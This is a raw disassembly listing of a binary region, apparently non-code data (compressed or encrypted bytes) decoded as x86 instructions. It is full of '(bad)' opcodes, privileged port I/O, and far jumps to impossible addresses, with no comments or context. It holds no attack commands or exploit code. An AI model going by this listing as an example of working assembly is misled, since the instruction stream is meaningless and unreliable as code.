  41c92f:	mov    bh,0xfa
  41c931:	scas   al,BYTE PTR es:[edi]
  41c932:	push   edx
  41c933:	jmp    0x5f17491d
  41c938:	es jbe 0x41c8c8
  41c93b:	sbb    DWORD PTR [ecx+0x47],edi
  41c93e:	sub    BYTE PTR [eax],al
  41c940:	aaa    
  41c941:	lahf   
  41c942:	cmp    DWORD PTR [ecx],0x40b8f2be
  41c948:	rol    BYTE PTR [ecx-0x78],1
  41c94b:	iret   
  41c94c:	xor    al,0xbf
  41c94e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c94f:	push   ds
  41c950:	mov    eax,ds:0x2c1a6802
  41c955:	mov    bx,0xf088
  41c959:	(bad)  
  41c95a:	(bad)  [eax+0x72]
  41c95d:	dec    esp
  41c95e:	call   0xe7ae:0x74897340
  41c965:	mov    ecx,0x61f6c3ff
  41c96a:	sub    cl,BYTE PTR [ebx]
  41c96c:	mov    edi,0xc948ccda
  41c971:	inc    esi
  41c972:	stc    
  41c973:	push   esp
  41c974:	cmp    eax,0xc9accb9e
  41c979:	pusha  
  41c97a:	in     al,0xef
  41c97c:	mov    cr2,edx
  41c97f:	inc    edx
  41c980:	mov    bl,0x5c
  41c982:	sbb    eax,0x2647c766
  41c987:	push   esi
  41c988:	lods   al,BYTE PTR ds:[esi]
  41c989:	and    bl,BYTE PTR [ecx+0x2a]
  41c98c:	push   ds
  41c98d:	dec    edx
  41c98e:	mov    ds:0x6ef7989b,al
  41c993:	mov    esi,0xa4b6d795
  41c998:	mov    eax,ds:0x934a5330
  41c99d:	ins    BYTE PTR es:[edi],dx
  41c99e:	lods   eax,DWORD PTR ds:[esi]
  41c99f:	dec    esi
  41c9a0:	cld    
  41c9a1:	sbb    DWORD PTR [ecx+0x4b],eax
  41c9a4:	fist   DWORD PTR [ebp+0x3f8f84a4]
  41c9aa:	js     0x41c992
  41c9ac:	out    0x91,eax
  41c9ae:	xor    ax,si
  41c9b1:	ins    DWORD PTR es:[edi],dx
  41c9b2:	mov    ebp,0xaa0068c9
  41c9b7:	rcl    cl,0x90
  41c9ba:	inc    ebp
  41c9bb:	call   0x8491:0xd719dab2
  41c9c2:	clc    
  41c9c3:	clc    
  41c9c4:	(bad)  
  41c9c5:	mov    cs,ebp
  41c9c7:	mov    dl,0x44
  41c9c9:	jmp    0x41c9e7
  41c9cb:	add    eax,0x8f128f19
  41c9d0:	cmc    
  41c9d1:	test   al,0x36
  41c9d3:	mov    eax,0xc1f96e9f
  41c9d8:	mov    al,0x20
  41c9da:	retf   0x4bc
  41c9dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9de:	dec    eax
  41c9df:	xor    ah,dl
  41c9e1:	dec    edi
  41c9e2:	call   0x68a7149f
  41c9e7:	mul    DWORD PTR [edx+0x11b0a1b8]
  41c9ed:	push   0x18166972
  41c9f2:	cli    
  41c9f3:	mov    BYTE PTR [ebp-0x20],bh
  41c9f6:	jg     0x41c9c6
  41c9f8:	aaa    
  41c9f9:	jmp    0xde88e494
  41c9fe:	iret   
  41c9ff:	and    al,BYTE PTR ds:[ebx]
  41ca02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca03:	shl    BYTE PTR [eax+0x3e1b4128],0xf1
  41ca0a:	bound  ecx,QWORD PTR fs:[ebx+eiz*2]
  41ca0e:	ins    BYTE PTR es:[edi],dx
  41ca0f:	inc    BYTE PTR [eax]
	...
  41ca71:	add    BYTE PTR [eax],al
  41ca73:	add    al,dh
  41ca75:	retf   0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	ins    DWORD PTR es:[edi],dx
  41ca81:	ss or  al,0x5c
  41ca84:	push   eax
  41ca85:	xor    BYTE PTR [ecx],al
  41ca87:	add    BYTE PTR [ecx+eax*1],al
  41ca8a:	add    BYTE PTR [eax],al
  41ca8c:	into   
  41ca8d:	cmp    al,0xd0
  41ca8f:	(bad)  [edi-0x15]
  41ca92:	mov    ebx,0x4a61cbef
  41ca97:	and    cl,dh
  41ca99:	pop    edx
  41ca9a:	dec    edi
  41ca9b:	jmp    0xccd:0xadf875f4
  41caa2:	cwde   
  41caa3:	shl    BYTE PTR [edi-0x17846189],1
  41caa9:	aad    0x95
  41caab:	pop    ebp
  41caac:	mul    DWORD PTR [eax+0x3e02a6d]
  41cab2:	test   DWORD PTR [ecx-0x512888d9],esi
  41cab8:	xchg   esp,eax
  41cab9:	jb     0x41ca9f
  41cabb:	stc    
  41cabc:	push   es
  41cabd:	xor    eax,0xf6287bb8
  41cac2:	pop    es
  41cac3:	xor    eax,0x740c886
  41cac8:	out    dx,eax
  41cac9:	pmulhuw mm1,QWORD PTR [edx+0x14]
  41cacd:	lds    ebp,FWORD PTR [eax-0x570e6010]
  41cad3:	out    dx,al
  41cad4:	daa    
  41cad5:	mov    edi,ds
  41cad7:	pop    edi
  41cad8:	int    0x9a
  41cada:	out    0x54,al
  41cadc:	sub    al,0x34
  41cade:	daa    
  41cadf:	pop    eax
  41cae0:	fstp   DWORD PTR [ebx]
  41cae2:	push   esp
  41cae3:	fwait
  41cae4:	test   ebp,0xff7a7e93
  41caea:	push   edi
  41caeb:	jmp    DWORD PTR [edx]
  41caed:	dec    eax
  41caee:	gs mov eax,0x3d2da3c0
  41caf4:	jge    0x41caca
  41caf6:	xor    DWORD PTR [eax+0x7fffb17c],0xcacc85e
  41cb00:	outs   dx,BYTE PTR ds:[esi]
  41cb01:	dec    edi
  41cb02:	adc    eax,0x3380ba04
  41cb07:	pop    eax
  41cb08:	(bad)  
  41cb09:	jns    0x41cac7
  41cb0b:	nop
  41cb0c:	add    edi,DWORD PTR [esi]
  41cb0e:	je     0x41cb59
  41cb10:	jb     0x41cabf
  41cb12:	pop    esi
  41cb13:	mov    ds:0xe32f53d6,eax
  41cb18:	nop
  41cb19:	int    0x9c
  41cb1b:	dec    esi
  41cb1c:	mov    bl,0x3c
  41cb1e:	jl     0x41caac
  41cb20:	cmp    cl,bl
  41cb22:	mov    esp,0x1ea56f7d
  41cb27:	xor    ch,BYTE PTR [ebp+0x166b683]
  41cb2d:	dec    ebp
  41cb2e:	rcl    BYTE PTR [esi+0x2b],1
  41cb31:	add    DWORD PTR [esi+0x3ea55aa2],edx
  41cb37:	gs in  al,0x10
  41cb3a:	xor    DWORD PTR [ebp-0x58c83364],0x5a00ba38
  41cb44:	ins    BYTE PTR es:[edi],dx
  41cb45:	lea    esi,[edx-0x1f58cdb3]
  41cb4b:	nop
  41cb4c:	in     eax,dx
  41cb4d:	dec    eax
  41cb4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb4f:	idiv   DWORD PTR [ebx-0x46]
  41cb52:	std    
  41cb53:	dec    eax
  41cb54:	cmp    dl,BYTE PTR [esi-0x29]
  41cb57:	popf   
  41cb58:	sar    BYTE PTR [edx],0xa8
  41cb5b:	push   es
  41cb5c:	sbb    al,0x4
  41cb5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb5f:	aas    
  41cb60:	stc    
  41cb61:	or     DWORD PTR [eax+0x6a],0xffffffdb
  41cb65:	loop   0x41cbd0
  41cb67:	push   esp
  41cb68:	out    dx,eax
  41cb69:	cmp    ebp,edi
  41cb6b:	fcmovne st,st(0)
  41cb6d:	popa   
  41cb6e:	mov    al,0x60
  41cb70:	out    0x90,eax
  41cb72:	pop    ebx
  41cb73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb74:	mov    DWORD PTR [esi],ecx
  41cb76:	retf   0x7c3d
  41cb79:	cmp    al,BYTE PTR [ecx]
  41cb7b:	add    al,BYTE PTR [ebp+0x6b]
  41cb7e:	xlat   BYTE PTR ds:[ebx]
  41cb7f:	imul   edi,DWORD PTR [esi-0x3ee1ba34],0x1ab1059e
  41cb89:	and    eax,0xe7d1faba
  41cb8e:	add    al,0xf7
	...
  41cbf4:	sub    esi,edx
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0x655bc322
  41cc03:	xchg   edx,eax
  41cc04:	push   esp
  41cc05:	xor    DWORD PTR [ecx],eax
  41cc07:	add    BYTE PTR [ecx+eax*1],al
  41cc0a:	add    BYTE PTR [eax],al
  41cc0c:	in     al,0x1b
  41cc0e:	dec    esp
  41cc0f:	ja     0x41cba6
  41cc11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc12:	jo     0x41cbba
  41cc14:	fimul  DWORD PTR [ecx+edx*4-0x3f]
  41cc18:	dec    DWORD PTR [edx]
  41cc1a:	xlat   BYTE PTR ds:[ebx]
  41cc1b:	fsub   st(2),st
  41cc1d:	pushf  
  41cc1e:	(bad)  
  41cc1f:	ret    
  41cc20:	xchg   edi,eax
  41cc21:	mov    ch,0xc5
  41cc23:	mov    ebp,0xa9f9273d
  41cc28:	icebp  
  41cc29:	repz iret 
  41cc2b:	in     eax,dx
  41cc2c:	scas   eax,DWORD PTR es:[edi]
  41cc2d:	mov    ds:0xe80ed731,eax
  41cc32:	test   eax,0xa5d0978
  41cc37:	test   eax,0x7dc1369b
  41cc3c:	test   bl,bh
  41cc3e:	dec    ebp
  41cc3f:	sbb    BYTE PTR [edx+0x2482c89d],dl
  41cc45:	push   ss
  41cc46:	add    al,0xf4
  41cc48:	daa    
  41cc49:	adc    eax,0x1f46a8
  41cc4e:	loope  0x41cc9d
  41cc50:	jae    0x41cc06
  41cc52:	stos   BYTE PTR es:[edi],al
  41cc53:	shr    DWORD PTR [ebx+0x53e19895],0x86
  41cc5a:	cmp    al,0xb2
  41cc5c:	push   ss
  41cc5d:	fidivr WORD PTR [ebp-0x31180a64]
  41cc63:	sub    al,0x74
  41cc65:	daa    
  41cc66:	pushf  
  41cc67:	mov    cl,0x60
  41cc69:	(bad)  
  41cc6a:	pop    edi
  41cc6b:	mov    edx,0xfa1573fd
  41cc70:	xchg   DWORD PTR [ebx],ebx
  41cc72:	pop    edx
  41cc73:	add    edi,ebp
  41cc75:	lock iret 
  41cc77:	cmp    DWORD PTR [ebx-0x21],ecx
  41cc7a:	pop    esp
  41cc7b:	cmc    
  41cc7c:	ds jns 0x41cc98
  41cc7f:	and    al,0xc2
  41cc81:	adc    eax,0xd63f5504
  41cc86:	loopne 0x41cc82
  41cc88:	out    dx,al
  41cc89:	mov    ah,0x16
  41cc8b:	(bad)  
  41cc8c:	mov    gs,WORD PTR [eax-0x46ba14]
  41cc92:	sbb    eax,0x372b5012
  41cc97:	test   eax,0x3653e23c
  41cc9c:	mov    edx,0x7933ad0
  41cca1:	add    bl,bh
  41cca3:	mov    esi,0x12ea4fe6
  41cca8:	data16 xlat BYTE PTR ds:[ebx]
  41ccaa:	cmp    esp,DWORD PTR [ebx-0x12a6fe26]
  41ccb0:	xor    dh,BYTE PTR [ebp-0x357c429c]
  41ccb6:	loopne 0x41cc39
  41ccb8:	cmp    ah,BYTE PTR [ebp+0x5e77c68b]
  41ccbe:	in     al,0xaf
  41ccc0:	lods   al,BYTE PTR ds:[esi]
  41ccc1:	cmp    al,0x2a
  41ccc3:	lahf   
  41ccc4:	mov    edx,0x9068a5a0
  41ccc9:	jg     0x41cd36
  41cccb:	les    edx,FWORD PTR [ebp+0x51]
  41ccce:	sbb    eax,0x7e849fce
  41ccd3:	sbb    BYTE PTR ds:0xe8bff7b3,dh
  41ccd9:	(bad)  
  41ccdb:	or     bl,BYTE PTR [eax+0x7bb0356a]
  41cce1:	out    dx,eax
  41cce2:	push   esp
  41cce3:	sti    
  41cce4:	retf   
  41cce5:	rcr    BYTE PTR [ebp+eax*2+0x1dc98a39],1
  41ccec:	out    dx,eax
  41cced:	mov    DWORD PTR ds:0x6f45e4be,esp
  41ccf3:	ret    
  41ccf4:	jb     0x41ccb9
  41ccf6:	stc    
  41ccf7:	in     eax,0xe
  41ccf9:	ror    DWORD PTR [esi-0x59cd01d5],cl
  41ccff:	pavgw  mm4,QWORD PTR [ecx]
  41cd02:	mov    eax,ds:0x6645dc8e
  41cd07:	push   ds
  41cd08:	fcomp  QWORD PTR [ebx]
  41cd0a:	add    ah,ch
  41cd0c:	out    dx,al
  41cd0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd0e:	leave  
  41cd0f:	rol    BYTE PTR [eax],cl
	...
  41cd71:	add    BYTE PTR [eax],al
  41cd73:	add    BYTE PTR [eax-0x67],ah
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	daa    
  41cd81:	pop    ds
  41cd82:	out    0x8f,al
  41cd84:	pop    eax
  41cd85:	xor    al,BYTE PTR [ecx]
  41cd87:	add    BYTE PTR [ecx+eax*1],al
  41cd8a:	add    BYTE PTR [eax],al
  41cd8c:	(bad)  
  41cd8d:	retf   0x6c25
  41cd90:	iret   
  41cd91:	imul   ecx,esi,0xce6fe226
  41cd97:	bound  esi,QWORD PTR [ebx-0x75422de7]
  41cd9d:	and    al,0x3
  41cd9f:	jmp    0x10740f53
  41cda4:	jb     0x41cd68
  41cda6:	and    ebx,DWORD PTR [edi-0x52]
  41cda9:	jge    0x41cddc
  41cdab:	or     al,0xa4
  41cdad:	not    DWORD PTR [esp+edi*1+0x13]
  41cdb1:	aad    0x4
  41cdb3:	inc    BYTE PTR [eax+0x6aa0289f]
  41cdb9:	lods   eax,DWORD PTR ds:[esi]
  41cdba:	push   eax
  41cdbb:	inc    eax
  41cdbc:	stos   BYTE PTR es:[edi],al
  41cdbd:	inc    ebp
  41cdbe:	jae    0x41cdf6
  41cdc0:	inc    ecx
  41cdc1:	mov    edx,0xe83c117b
  41cdc6:	sbb    BYTE PTR [eax],al
  41cdc8:	ret    0xa2e6
  41cdcb:	mov    DWORD PTR [ecx],edx
  41cdcd:	inc    ecx
  41cdce:	jo     0x41ce49
  41cdd0:	scas   eax,DWORD PTR es:[edi]
  41cdd1:	jno    0x41ce0c
  41cdd3:	jno    0x41cdeb
  41cdd5:	sbb    al,0x4f
  41cdd7:	push   eax
  41cdd8:	aad    0x75
  41cdda:	pop    ebx
  41cddb:	in     al,dx
  41cddc:	(bad)  
  41cddd:	nop
  41cdde:	mov    al,ds:0x55876fb3
  41cde3:	pushf  
  41cde4:	ficom  WORD PTR [esi]
  41cde6:	dec    edx
  41cde7:	int3   
  41cde8:	mov    ebx,0x4da0c623
  41cded:	jne    0x41cd90
  41cdef:	and    DWORD PTR [ebx+eax*8-0x48f405df],ebx
  41cdf6:	adc    al,0xd5
  41cdf8:	jbe    0x41ce62
  41cdfa:	dec    edx
  41cdfb:	push   es
  41cdfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdfd:	aas    
  41cdfe:	inc    esi
  41cdff:	or     al,0x6d
  41ce01:	ror    bl,0x50
  41ce04:	sbb    al,0x61
  41ce06:	in     al,dx
  41ce07:	pop    esi
  41ce08:	pop    ss
  41ce09:	test   eax,0xb038dec9
  41ce0e:	in     eax,dx
  41ce0f:	cli    
  41ce10:	mov    bl,0xfa
  41ce12:	xor    dl,BYTE PTR [edi-0x6b]
  41ce15:	inc    eax
  41ce16:	cwde   
  41ce17:	cmp    cl,dl
  41ce19:	jl     0x41ce4f
  41ce1b:	rol    BYTE PTR [eax+0x5d],cl
  41ce1e:	retf   
  41ce1f:	outs   dx,BYTE PTR ds:[esi]
  41ce20:	lahf   
  41ce21:	stos   DWORD PTR es:[edi],eax
  41ce22:	cdq    
  41ce23:	inc    ebx
  41ce24:	jnp    0x41cdf9
  41ce26:	retf   0x68b0
  41ce29:	sbb    ebx,DWORD PTR [eax-0x7a]
  41ce2c:	icebp  
  41ce2d:	fmul   st,st(4)
  41ce2f:	leave  
  41ce30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce31:	adc    BYTE PTR [ebx-0x10],0xf3
  41ce35:	mov    dh,0x90
  41ce37:	sbb    DWORD PTR gs:[ecx],ebp
  41ce3a:	mov    edx,0xbca4e187
  41ce3f:	mov    BYTE PTR [ebp+0x30],ch
  41ce42:	int    0xdf
  41ce44:	mov    al,dh
  41ce46:	push   0xffffff83
  41ce48:	pop    ds
  41ce49:	inc    esp
  41ce4a:	xchg   esp,eax
  41ce4b:	sbb    DWORD PTR [eax],ecx
  41ce4d:	adc    esi,esp
  41ce4f:	pop    ecx
  41ce50:	mov    edx,0x7c41a217
  41ce55:	(bad)  
  41ce56:	das    
  41ce57:	cmp    eax,0x63f15d01
  41ce5c:	es add al,0xfe
  41ce5f:	pushf  
  41ce60:	stos   BYTE PTR es:[edi],al
  41ce61:	sub    eax,0x9d06b31c
  41ce66:	das    
  41ce67:	outs   dx,DWORD PTR ds:[esi]
  41ce68:	sar    DWORD PTR [eiz*2+0x7221ee1b],0xfc
  41ce70:	sub    al,al
  41ce72:	mov    esi,DWORD PTR [eax+0x7aa1f22d]
  41ce78:	sub    edi,ecx
  41ce7a:	out    dx,eax
  41ce7b:	jp     0x41ce15
  41ce7d:	pop    ds
  41ce7e:	daa    
  41ce7f:	sbb    ebp,DWORD PTR [edx+0x1d]
  41ce82:	mov    al,bh
  41ce84:	xor    edi,DWORD PTR [ebp-0x7303ff18]
  41ce8a:	mov    al,0xdc
  41ce8c:	adc    esp,DWORD PTR [eax+0x2986]
	...
  41cef2:	add    BYTE PTR [eax],al
  41cef4:	pop    es
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	push   esp
  41cf01:	pop    es
  41cf02:	and    BYTE PTR [esi],bh
  41cf04:	pop    esp
  41cf05:	xor    eax,DWORD PTR [ecx]
  41cf07:	add    BYTE PTR [ecx+eax*1],al
  41cf0a:	add    BYTE PTR [eax],al
  41cf0c:	mov    ds:0x1a13997f,al
  41cf11:	inc    esp
  41cf12:	xchg   ebx,eax
  41cf13:	mov    ds:0x211303b7,eax
  41cf18:	cli    
  41cf19:	pop    esp
  41cf1a:	jns    0x41ced5
  41cf1c:	jp     0x41cf64
  41cf1e:	and    dl,dl
  41cf20:	packsswb mm7,mm7
  41cf23:	clc    
  41cf24:	dec    eax
  41cf25:	mov    BYTE PTR [edi],dh
  41cf27:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41cf29:	pop    ecx
  41cf2a:	or     al,0x2c
  41cf2c:	shr    BYTE PTR [ebx+0x45f38a0a],0x12
  41cf33:	xchg   esp,eax
  41cf34:	sbb    al,0xcd
  41cf36:	or     eax,0xabf6e79b
  41cf3b:	in     eax,0x2a
  41cf3d:	push   esp
  41cf3e:	jmp    0x41ced4
  41cf40:	push   esi
  41cf41:	lds    ebp,FWORD PTR [esi]
  41cf43:	xchg   esi,eax
  41cf44:	popf   
  41cf45:	xor    dl,BYTE PTR [edi+0x6e20c832]
  41cf4b:	xor    edx,DWORD PTR [eax-0x71]
  41cf4e:	xchg   esi,eax
  41cf4f:	test   eax,0x6840e794
  41cf54:	xchg   edx,eax
  41cf55:	or     dh,BYTE PTR [edi-0x144b8ae8]
  41cf5b:	daa    
  41cf5c:	test   DWORD PTR [ebp-0x589f741],ebp
  41cf62:	(bad)  
  41cf63:	pop    ecx
  41cf64:	test   ah,ch
  41cf66:	xchg   edx,eax
  41cf67:	(bad)  
  41cf68:	mov    BYTE PTR [edi-0x34913daa],al
  41cf6e:	mov    esp,0x7817d934
  41cf73:	outs   dx,BYTE PTR ds:[esi]
  41cf74:	shl    BYTE PTR [ecx+edi*2],cl
  41cf77:	lock xchg edi,eax
  41cf79:	jo     0x41cfad
  41cf7b:	sbb    ah,dl
  41cf7d:	xchg   DWORD PTR [esi+0x42214af8],esp
  41cf83:	jecxz  0x41cf36
  41cf85:	fsub   DWORD PTR [eax]
  41cf87:	gs adc eax,0x77eade21
  41cf8d:	mov    ds:0x3e334f81,eax
  41cf92:	inc    edi
  41cf93:	xor    eax,0x2d38eb8a
  41cf98:	ret    0x827c
  41cf9b:	test   BYTE PTR [esi+0x42],0x57
  41cf9f:	fnsave [edi]
  41cfa1:	mov    esp,0xd7dd73b3
  41cfa6:	arpl   WORD PTR [eax+ebp*4+0x63],bp
  41cfaa:	adc    ebp,DWORD PTR [eiz*2+0x3cb0bbe1]
  41cfb1:	push   ds
  41cfb2:	mov    eax,0x2df33524
  41cfb7:	clc    
  41cfb8:	sbb    al,0xad
  41cfba:	aaa    
  41cfbb:	adc    BYTE PTR [ebp+0x30],bh
  41cfbe:	dec    ecx
  41cfbf:	pop    es
  41cfc0:	jecxz  0x41cfd2
  41cfc2:	cmp    al,0xa2
  41cfc4:	mov    dl,ah
  41cfc6:	ss mov bl,0x4e
  41cfc9:	stos   BYTE PTR es:[edi],al
  41cfca:	mov    gs,WORD PTR [esi+eax*1-0x10]
  41cfce:	cmp    ecx,DWORD PTR [ecx-0x6e]
  41cfd1:	sbb    dl,bh
  41cfd3:	les    ebx,FWORD PTR [edi+0x2c]
  41cfd6:	xor    ebp,DWORD PTR [edi+0x45]
  41cfd9:	jb     0x41cfb6
  41cfdb:	or     esi,edx
  41cfdd:	adc    ch,BYTE PTR [esi+0x21]
  41cfe0:	fisttp DWORD PTR [edi]
  41cfe2:	das    
  41cfe3:	pop    ebp
  41cfe4:	cmp    DWORD PTR [ecx],edi
  41cfe6:	jmp    FWORD PTR [ecx]
  41cfe8:	mov    DWORD PTR [edx],ecx
  41cfea:	sub    al,0xe4
  41cfec:	mov    WORD PTR [ebp+ecx*2-0xb],?
  41cff0:	in     eax,0x8b
  41cff2:	dec    ecx
  41cff3:	push   esp
  41cff4:	inc    eax
  41cff5:	jo     0x41cfec
  41cff7:	dec    eax
  41cff8:	cwde   
  41cff9:	or     al,0x23
  41cffb:	fisttp DWORD PTR [esi+0x1b440e9b]
  41d001:	inc    esp
  41d002:	mov    edi,0xb00f87c9
  41d007:	pop    ss
  41d008:	leave  
  41d009:	stos   BYTE PTR es:[edi],al
  41d00a:	arpl   dx,di
  41d00c:	jo     0x41d015
  41d00e:	test   edi,0x0
	...
  41d074:	mov    ecx,0xad432034
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0x20d939bd
  41d083:	mov    cl,0x60
  41d085:	xor    al,0x1
  41d087:	add    BYTE PTR [ecx+eax*1],al
  41d08a:	add    BYTE PTR [eax],al
  41d08c:	std    
  41d08d:	pop    ds
  41d08e:	dec    ecx
  41d08f:	add    esp,DWORD PTR [esi+0x10]
  41d092:	pop    ss
  41d093:	mov    ebp,0x3ac61ae2
  41d098:	lods   eax,DWORD PTR ds:[esi]
  41d099:	int    0x82
  41d09b:	sub    edi,DWORD PTR [ebx]
  41d09d:	(bad)  
  41d09e:	xor    bl,BYTE PTR [esi]
  41d0a0:	pop    esp
  41d0a1:	cmp    edx,ebx
  41d0a3:	imul   esp,DWORD PTR [esi+0x42013f88],0x5afb1f38
  41d0ad:	lods   eax,DWORD PTR ds:[esi]
  41d0ae:	mov    al,0x99
  41d0b0:	cmp    eax,0x52a16656
  41d0b5:	and    BYTE PTR [edx],dh
  41d0b7:	add    bl,BYTE PTR [esi+ebp*1-0x630e64f8]
  41d0be:	push   ecx
  41d0bf:	ror    BYTE PTR [ecx-0xb],0x6
  41d0c3:	mov    WORD PTR [esi],ss
  41d0c5:	jle    0x41d0e8
  41d0c7:	pop    ds
  41d0c8:	xor    BYTE PTR [eax-0xeeea79d],ch
  41d0ce:	push   DWORD PTR [ebx-0x44]
  41d0d1:	ss cdq 
  41d0d3:	test   ebx,0x23775817
  41d0d9:	aaa    
  41d0da:	xor    esp,esi
  41d0dc:	das    
  41d0dd:	sub    dh,bl
  41d0df:	xchg   BYTE PTR [ebx],cl
  41d0e1:	sub    dl,0x63
  41d0e4:	push   0xffffffaa
  41d0e6:	sub    BYTE PTR [edx],dh
  41d0e8:	adc    ah,BYTE PTR [ebp+0x4feca421]
  41d0ee:	imul   edx
  41d0f0:	jmp    0x41d109
  41d0f2:	jns    0x41d0f9
  41d0f4:	outs   dx,BYTE PTR ds:[esi]
  41d0f5:	imul   dx,WORD PTR [edi+esi*1],0x7b91
  41d0fb:	inc    esp
  41d0fc:	fs push 0x6c7784ea
  41d102:	adc    eax,0xe576be33
  41d107:	adc    BYTE PTR [ebx+0x174f0a27],ah
  41d10d:	jno    0x41d181
  41d10f:	and    al,0x55
  41d111:	jmp    0x4812a822
  41d116:	out    0x30,al
  41d118:	adc    DWORD PTR [eax-0x27],edi
  41d11b:	sbb    al,0x6b
  41d11d:	cwde   
  41d11e:	push   eax
  41d11f:	add    BYTE PTR [ecx+0x4f398735],cl
  41d125:	(bad)
  41d129:	jmp    0x1c141dab
  41d12e:	je     0x41d1a4
  41d130:	imul   ebx,DWORD PTR [ebx-0x7f],0x9
  41d134:	inc    ebx
  41d135:	add    BYTE PTR [edx],ah
  41d137:	enter  0x3858,0x5f
  41d13b:	inc    eax
  41d13c:	sbb    eax,0x60af4169
  41d141:	pop    ds
  41d142:	(bad)  
  41d143:	ins    DWORD PTR es:[edi],dx
  41d144:	rcr    BYTE PTR [eax-0x615b3a91],1
  41d14a:	test   BYTE PTR [ebx+edx*4-0x78],ch
  41d14e:	gs ins DWORD PTR es:[edi],dx
  41d150:	mov    edx,0xa76a893f
  41d155:	lahf   
  41d156:	sbb    eax,0x5f0a81f2
  41d15b:	int3   
  41d15c:	jb     0x41d15b
  41d15e:	icebp  
  41d15f:	jmp    0xad50e4c8
  41d164:	out    dx,eax
  41d165:	lods   eax,DWORD PTR ds:[esi]
  41d166:	xchg   edi,eax
  41d167:	sbb    ecx,DWORD PTR fs:[edi-0x3754d7c9]
  41d16e:	loop   0x41d114
  41d170:	inc    eax
  41d171:	daa    
  41d172:	mov    BYTE PTR [ecx-0x7],dh
  41d175:	inc    ebp
  41d176:	sub    al,0xb6
  41d178:	mov    dl,0x4e
  41d17a:	and    al,0x4b
  41d17c:	push   ss
  41d17d:	enter  0xc1e5,0x74
  41d181:	rcr    DWORD PTR [esi+0x7],cl
  41d184:	mov    dl,0x70
  41d186:	sti    
  41d187:	xchg   ebp,eax
  41d188:	pop    esi
  41d189:	and    al,0x58
  41d18b:	inc    eax
  41d18c:	repnz es push cs
  41d18f:	fiadd  DWORD PTR [eax]
	...
  41d1f1:	add    BYTE PTR [eax],al
  41d1f3:	add    BYTE PTR [eax-0x3d],dl
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	jbe    0x41d27d
  41d202:	mov    cs:0x13564,al
  41d208:	add    al,0x1
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	pop    ebx
  41d20d:	test   BYTE PTR [edi],0x59
  41d210:	inc    ebx
  41d211:	test   BYTE PTR [esi+0x57312a74],ch
  41d217:	(bad)  
  41d218:	cmp    DWORD PTR [ecx+eiz*2],0x4c
  41d21c:	ja     0x41d1f3
  41d21e:	dec    ebp
  41d21f:	adc    ebx,esp
  41d221:	sbb    al,0x7d
  41d223:	sahf   
  41d224:	pop    ebx
  41d225:	or     BYTE PTR [ebx],dh
  41d227:	div    ah
  41d229:	pusha  
  41d22a:	loop   0x41d298
  41d22c:	sahf   
  41d22d:	fld    TBYTE PTR [ecx]
  41d22f:	adc    ebp,ebp
  41d231:	jecxz  0x41d293
  41d233:	fld    DWORD PTR [esi-0x53bab9d7]
  41d239:	pop    ebp
  41d23a:	jae    0x41d2b4
  41d23c:	iret   
  41d23d:	mov    ch,0xdb
  41d23f:	icebp  
  41d240:	or     bh,al
  41d242:	out    dx,al
  41d243:	fistp  WORD PTR [ebx+0x7540573]
  41d249:	mov    dl,BYTE PTR ss:[ebx+0xe]
  41d24d:	scas   eax,DWORD PTR es:[edi]
  41d24e:	inc    si
  41d250:	dec    ecx
  41d251:	shl    BYTE PTR [ecx],1
  41d253:	xchg   esi,eax
  41d254:	lock jecxz 0x41d284
  41d257:	loop   0x41d1e9
  41d259:	(bad)  
  41d25a:	pop    edi
  41d25b:	in     eax,dx
  41d25c:	mov    edi,0xf3c3beab
  41d261:	and    BYTE PTR [eax],dh
  41d263:	and    ecx,edx
  41d265:	mov    bl,0x6e
  41d267:	pop    es
  41d268:	sub    BYTE PTR [bx+di+0x6279],0x94
  41d26e:	sar    eax,1
  41d270:	mov    ebp,0xa698e33c
  41d275:	xchg   esp,eax
  41d276:	imul   edi,eax,0x4f
  41d279:	push   ecx
  41d27a:	mov    eax,ecx
  41d27c:	and    eax,0x79eb69ba
  41d281:	ja     0x41d2d5
  41d283:	lds    ecx,FWORD PTR [esi-0x72]
  41d286:	sub    BYTE PTR [ebp-0x532572a6],dl
  41d28c:	in     al,dx
  41d28d:	or     al,0x84
  41d28f:	ds sub eax,0x9d7f6d64
  41d295:	xor    eax,0x2a35281
  41d29a:	jnp    0x41d222
  41d29c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d29d:	(bad)
  41d2a0:	stos   BYTE PTR es:[edi],al
  41d2a1:	add    edx,edi
  41d2a3:	bound  edx,QWORD PTR [edx]
  41d2a5:	pop    ds
  41d2a6:	dec    eax
  41d2a7:	adc    DWORD PTR [esp+edi*4-0x51f88514],eax
  41d2ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2af:	jne    0x41d2fc
